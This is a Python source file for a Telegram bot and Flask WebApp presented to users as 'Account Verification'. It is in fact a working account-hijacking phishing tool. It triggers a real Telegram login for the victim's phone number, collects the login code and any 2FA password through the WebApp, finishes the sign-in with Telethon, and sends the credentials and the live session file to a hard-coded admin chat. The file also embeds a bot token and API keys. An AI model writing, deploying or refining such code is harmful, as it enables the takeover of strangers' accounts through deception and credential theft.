import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import json
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# =============== CONFIGURATION ===============
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Storage
user_data = {}  # user_id -> {phone, name, username, etc}
otp_sessions = {}  # phone -> {client, phone_code_hash}
verification_status = {}  # user_id -> {stage, phone, otp_attempts}

# =============== HELPER FUNCTIONS ===============
def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION DATA</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            if user_info.get('name'):
                message += f"\n👤 Name: {user_info['name']}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info['username']}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file if exists
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

async def send_otp_via_telethon(phone):
    """Send OTP using Telethon"""
    try:
        os.makedirs('sessions', exist_ok=True)
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        logger.info(f"📤 Sending OTP to {phone}")
        sent = await client.send_code_request(phone)
        
        otp_sessions[phone] = {
            'client': client,
            'phone_code_hash': sent.phone_code_hash,
            'sent_time': time.time()
        }
        
        return {'success': True, 'message': 'OTP sent'}
    except FloodWaitError as e:
        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_otp_via_telethon(phone, otp_code):
    """Verify OTP using Telethon"""
    try:
        if phone not in otp_sessions:
            return {'success': False, 'error': 'Session expired'}
        
        client_data = otp_sessions[phone]
        client = client_data['client']
        phone_code_hash = client_data['phone_code_hash']
        
        await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            await client.session.save()
            session_file = client.session.filename
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
        else:
            return {'success': False, 'error': 'Not authorized'}
            
    except SessionPasswordNeededError:
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeInvalidError:
        return {'success': False, 'error': 'Invalid OTP'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_2fa_via_telethon(phone, password):
    """Verify 2FA password"""
    try:
        if phone not in otp_sessions:
            return {'success': False, 'error': 'Session expired'}
        
        client = otp_sessions[phone]['client']
        await client.sign_in(password=password)
        
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        await client.session.save()
        session_file = client.session.filename
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

# =============== BOT HANDLERS ===============
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Get current domain
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            webapp_url = f"https://{RENDER_EXTERNAL_HOSTNAME}" if RENDER_EXTERNAL_HOSTNAME else "https://your-app.onrender.com"
        else:
            webapp_url = f"http://localhost:{os.environ.get('PORT', 5000)}"
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(webapp_url)
        )
        kb.add(btn)
        
        bot.send_message(
            message.chat.id,
            f"""👋 <b>Hello {first_name}!</b>

Welcome to Account Verification Bot

Click the button below to verify your account:

✅ <b>Features:</b>
• Share contact in WebApp
• Receive 5-digit OTP here
• Enter OTP in WebApp
• 2FA support if enabled

<b>Click below to begin:</b>""",
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"Sent /start to user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
            'phone': phone,
            'username': message.from_user.username,
            'lang': message.from_user.language_code,
            'contact_time': time.time()
        }
        
        # Update verification status
        verification_status[user_id] = {
            'stage': 'contact_received',
            'phone': phone,
            'otp_attempts': 0
        }
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"✅ <b>Contact Received!</b>\n\n📱 Phone: {phone}\n\n⏳ Sending OTP via Telegram...",
            parse_mode='HTML'
        )
        
        # Send OTP via Telethon in background
        def send_otp_task():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(send_otp_via_telethon(phone))
                loop.close()
                
                if result['success']:
                    bot.edit_message_text(
                        f"""✅ <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> has been sent via Telegram

Check your messages for the 5-digit code.

<i>Telegram OTPs are always 5 digits (e.g., 12345)</i>""",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin
                    send_to_admin(phone, user_info=user_data[user_id])
                    
                    logger.info(f"✅ OTP sent to {phone}")
                else:
                    bot.edit_message_text(
                        f"❌ <b>Error:</b> {result.get('error', 'Failed to send OTP')}",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
        
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")

# =============== FLASK ROUTES ===============
@app.route('/')
def index():
    """Main WebApp page"""
    return render_template('index.html')

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    """Get user data for WebApp"""
    data = user_data.get(user_id, {})
    status = verification_status.get(user_id, {})
    
    response = {
        'phone': data.get('phone', ''),
        'name': data.get('name', ''),
        'username': data.get('username', ''),
        'lang': data.get('lang', ''),
        'stage': status.get('stage', 'waiting'),
        'verified': status.get('verified', False)
    }
    
    return jsonify(response)

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 OTP verification for user {user_id}")
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # Clean OTP (5 digits)
        cleaned_otp = ''.join(filter(str.isdigit, otp))
        if len(cleaned_otp) != 5:
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        # Get user phone
        user_info = user_data.get(int(user_id), {})
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Check attempts
        if user_id in verification_status:
            verification_status[user_id]['otp_attempts'] += 1
            if verification_status[user_id]['otp_attempts'] > 3:
                return jsonify({'success': False, 'error': 'Too many attempts'})
        
        # Verify OTP
        def verify_task():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(verify_otp_via_telethon(phone, cleaned_otp))
                loop.close()
                return result
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        result = verify_task()
        
        if result['success']:
            if result.get('requires_2fa'):
                verification_status[user_id]['stage'] = 'needs_2fa'
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Successfully verified
                verification_status[user_id]['stage'] = 'verified'
                verification_status[user_id]['verified'] = True
                
                # Send to admin
                send_to_admin(
                    phone, 
                    otp=cleaned_otp,
                    user_info=result.get('user_info'),
                    session_file=result.get('session_file')
                )
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        logger.error(f"API verify error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA password"""
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        
        if not user_id or not password:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        user_info = user_data.get(int(user_id), {})
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Verify 2FA
        def verify_2fa_task():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(verify_2fa_via_telethon(phone, password))
                loop.close()
                return result
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        result = verify_2fa_task()
        
        if result['success']:
            verification_status[user_id]['stage'] = 'verified'
            verification_status[user_id]['verified'] = True
            
            # Send to admin with password
            send_to_admin(
                phone,
                password=password,
                user_info=result.get('user_info'),
                session_file=result.get('session_file')
            )
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', '2FA verification failed')
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# =============== RUN FUNCTIONS ===============
def run_bot():
    """Run bot with polling"""
    logger.info("🤖 Starting bot polling...")
    try:
        bot.remove_webhook()
        time.sleep(1)
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        logger.error(f"Bot error: {e}")
        time.sleep(5)
        run_bot()

def run_flask():
    """Run Flask server"""
    port = int(os.environ.get("PORT", 5000))
    logger.info(f"🚀 Starting Flask on port {port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)

# =============== MAIN ===============
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot")
    logger.info("="*60)
    
    # Start bot in separate thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Give bot time to start
    time.sleep(2)
    
    # Run Flask in main thread
    run_flask()
